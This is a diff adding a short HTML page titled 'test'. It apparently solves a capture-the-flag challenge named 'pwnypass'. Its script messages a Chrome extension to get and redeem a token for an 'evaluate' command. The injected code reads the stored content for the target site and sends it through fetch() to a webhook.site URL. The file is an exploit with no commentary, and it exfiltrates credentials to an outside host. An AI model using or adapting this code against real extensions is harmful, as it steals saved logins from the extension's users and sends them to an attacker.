@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>test</title>
+</head>
+<body>
+<script>
+    const issueToken = async (command, args) => new Promise((res) => chrome.runtime.sendMessage({
+        action: "issue",
+        command,
+        args
+    }, (tok) => res(tok)));
+    const redeemToken = async (token, hmac) => new Promise((res) => chrome.runtime.sendMessage({
+        action: "redeem",
+        token,
+        hmac
+    }, (creds) => res(creds)));
+
+    ;(async () => {
+        // new URL('https://pwnypass.c.hc.lc/login.php').origin
+        const [token, hmac] = await issueToken('evaluate', ['read("https://pwnypass.c.hc.lc").then(c => fetch(`https://webhook.site/80bc30db-b6cd-43e4-9088-4fd7f1ef3b08?c=${c}`))']);
+        await redeemToken(token, hmac);
+    })()
+</script>
+</body>
+</html>
